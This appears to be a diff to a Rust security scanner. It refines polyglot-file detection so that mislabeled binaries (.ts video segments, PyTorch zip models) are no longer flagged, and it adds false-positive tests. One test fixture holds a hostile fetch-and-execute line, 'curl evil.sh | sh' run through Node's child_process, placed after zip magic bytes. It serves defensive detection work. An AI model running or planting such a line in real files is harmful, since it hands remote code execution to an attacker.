@@ -356,10 +356,62 @@ pub fn scan_line(
     }
 }
 
+/// Whether the bytes contain a run of plausible source code.
+///
+/// Real polyglots carry executable source alongside the binary payload; a
+/// mislabeled media file or model archive carries none. Looks for a long
+/// printable-ASCII run holding a source-ish token, which compressed binary
+/// data effectively never produces.
+fn has_source_text(raw_bytes: &[u8]) -> bool {
+    // Only the head of the file matters: a polyglot's source payload has to sit
+    // near the start to be parsed. Scanning deeper just samples more compressed
+    // entropy, where a short token like "/*" appears by chance — that is exactly
+    // what made a 572MB model archive look like a polyglot.
+    // ponytail: fixed 8KB head, no entropy math. Revisit if a real polyglot
+    // buries its payload deeper.
+    const SCAN_LIMIT: usize = 8 * 1024;
+    const MIN_RUN: usize = 8;
+    const TOKENS: &[&str] = &[
+        "function", "const ", "let ", "var ", "import ", "require(", "export ", "class ", "def ",
+        "return", "#!/", "eval(", "=>", "<?php",
+        // Comment syntax is source too — a polyglot's payload is often a
+        // comment-wrapped stub rather than a keyword-bearing statement.
+        // Block markers only: a bare "//" also matches zip entry paths
+        // ("model/data/0"), which are not code.
+        "/*", "*/", "<!--", "// ",
+    ];
+
+    let window = &raw_bytes[..SCAN_LIMIT.min(raw_bytes.len())];
+    let mut run_start = 0usize;
+    for i in 0..=window.len() {
+        let printable = i < window.len()
+            && (window[i].is_ascii_graphic() || window[i] == b' ' || window[i] == b'\t');
+        if printable {
+            continue;
+        }
+        if i - run_start >= MIN_RUN {
+            let run = String::from_utf8_lossy(&window[run_start..i]);
+            if TOKENS.iter().any(|t| run.contains(t)) {
+                return true;
+            }
+        }
+        run_start = i + 1;
+    }
+    false
+}
+
 /// Rule 10: Polyglot file detection — binary magic bytes in source file extensions.
 pub fn check_polyglot(raw_bytes: &[u8], file_path: &str, path: &Path) -> Option<AuditFinding> {
     let ext = path.extension().and_then(|e| e.to_str()).unwrap_or("");
     if !SOURCE_EXTENSIONS.contains(&ext) {
+        return None;
+    }
+
+    // A polyglot is dangerous because it parses as *both* source and binary.
+    // A file that is only the binary (a .ts MPEG segment, a .ts PyTorch zip)
+    // is mislabeled, not an attack — and ambiguous extensions like .ts make
+    // that the common case. Require some plausible source text before flagging.
+    if !has_source_text(raw_bytes) {
         return None;
     }
 
@@ -856,5 +908,72 @@ mod tests {
 
         let finding = check_suspicious_dotfile(&dotfile);
         assert!(finding.is_none());
+    }
+}
+
+#[cfg(test)]
+mod polyglot_fp_tests {
+    use super::*;
+    use std::path::PathBuf;
+
+    /// A PyTorch/zip model saved as .ts must not be a "polyglot".
+    #[test]
+    fn test_zip_model_as_ts_not_polyglot() {
+        let mut content = b"PK\x03\x04\x00\x00\x08\x08".to_vec();
+        content.extend_from_slice(&[0x42u8; 4096]);
+        let path = PathBuf::from("mobileclip_blt.ts");
+        assert!(check_polyglot(&content, "mobileclip_blt.ts", &path).is_none());
+    }
+
+    /// An MPEG-TS segment named .ts must not be a "polyglot".
+    #[test]
+    fn test_mpegts_segment_not_polyglot() {
+        let mut content = Vec::new();
+        for i in 0..10 {
+            content.push(0x47u8);
+            content.extend_from_slice(&[(i % 251) as u8; 187]);
+        }
+        let path = PathBuf::from("segment_001.ts");
+        assert!(check_polyglot(&content, "segment_001.ts", &path).is_none());
+    }
+
+    /// Zip entry paths ("model/data/0") contain "//"-like runs but are not
+    /// source; they must not resurrect the polyglot false positive.
+    #[test]
+    fn test_zip_entry_paths_not_source_text() {
+        let mut content = b"PK\x03\x04\x00\x00\x08\x08".to_vec();
+        for i in 0..8 {
+            content.extend_from_slice(format!("mobileclip_blt/data/{}FB", i).as_bytes());
+            content.extend_from_slice(&[b'Z'; 40]);
+        }
+        let path = PathBuf::from("mobileclip_blt.ts");
+        assert!(check_polyglot(&content, "mobileclip_blt.ts", &path).is_none());
+    }
+
+    /// Compressed binary eventually contains any short token by chance
+    /// ("/*" appeared ~366KB into a real 572MB model). Deep entropy must not
+    /// count as source text.
+    #[test]
+    fn test_deep_random_binary_not_source_text() {
+        let mut content = b"PK\x03\x04\x00\x00\x08\x08".to_vec();
+        let mut x: u32 = 0x1234_5678;
+        while content.len() < 512 * 1024 {
+            x = x.wrapping_mul(1_103_515_245).wrapping_add(12_345);
+            content.push((x >> 16) as u8);
+        }
+        content.extend_from_slice(b"n<'N ;4/*<F padding to make a long run");
+        let path = PathBuf::from("model.ts");
+        assert!(check_polyglot(&content, "model.ts", &path).is_none());
+    }
+
+    /// Real polyglot: zip magic followed by actual JS still fires.
+    #[test]
+    fn test_real_polyglot_still_detected() {
+        let mut content = b"PK\x03\x04".to_vec();
+        content.extend_from_slice(b"\nrequire('child_process').exec('curl evil.sh | sh');\n");
+        let path = PathBuf::from("payload.js");
+        let finding = check_polyglot(&content, "payload.js", &path);
+        assert!(finding.is_some(), "genuine polyglot must still be flagged");
+        assert_eq!(finding.unwrap().rule_id, "obfuscation-polyglot");
     }
 }
